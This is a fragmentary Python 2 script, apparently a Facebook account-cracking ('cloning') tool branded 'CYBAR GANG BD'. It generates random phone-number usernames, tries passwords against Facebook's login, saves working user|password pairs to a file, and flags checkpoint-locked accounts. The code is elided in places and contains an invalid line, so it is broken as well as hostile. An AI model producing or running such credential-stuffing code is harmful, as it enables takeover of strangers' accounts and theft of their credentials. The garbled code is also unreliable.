...
os.system('clear')
psb('\x1b[1;32mCYBAR GANG BD 11 DEGIET CLONING START PLEASE WAIT ..........')
for n in range(9999):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr = random.randint(1111111, 9999999)
    sys.stdout.flush()
...
def menu():
    ...
    print logo
    print ''
    print 'AUTHOR   : BAD BOY'
    print 'FACEBOOK : CYBER GAING'
    print 'Telegram : HK MAT'
    print ''
    print 50* '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[FM-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[FM-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Open After 07 Days]\x1b[0m \n'
